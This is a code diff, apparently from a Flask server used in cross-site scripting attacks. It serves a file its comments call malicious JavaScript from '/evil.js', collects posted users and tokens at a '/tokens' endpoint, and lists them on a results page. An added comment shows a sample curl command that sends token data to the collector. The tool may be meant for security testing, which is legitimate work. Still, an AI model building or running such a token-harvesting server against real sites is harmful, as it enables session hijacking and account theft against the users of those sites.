@@ -1,12 +1,12 @@
 from flask import Flask, send_file, make_response, request, render_template, redirect, json
 from database import Database as database_obj
 import argparse
-import sys
 
 app = Flask(__name__)
 
-# Triggered by POST request, this will commit users and tokens to DB
-# Note the URL is "/tokens".
+# Commit users and tokens to DB. Note the URL is "/tokens".
+# curl http://{URL}:{PORT}/tokens -X POST -d "user=Foo&token=Bar"
+
 @app.route('/tokens', methods=['POST'])
 def tokensjs():
     f = request.form
@@ -27,12 +27,14 @@ def tokensjs():
             200
     )
 
-# Triggered by a GET request - this will send malicious javascript file
+# Triggered by a GET request - this will send malicious javascript file. 
+# Use for DOM-based or "script src=" style testing.
 @app.route('/evil.js', methods=(['GET']))
 def eviljs():
     print("Sending XSS JS file")
     return send_file('./evil.js', download_name='evil.js')
 
+# Home page.  View table contents.
 @app.route('/results', methods=(["GET"]))
 def home():
     results = db_obj.get_table(conn)
@@ -54,7 +56,7 @@ def delete():
         print("Error in Delete API endpoint." + key)
         return redirect('/results', code=302)
 
-
+# MAIN
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
     parser.add_argument('--new', help='Make new Database', action='store_true')
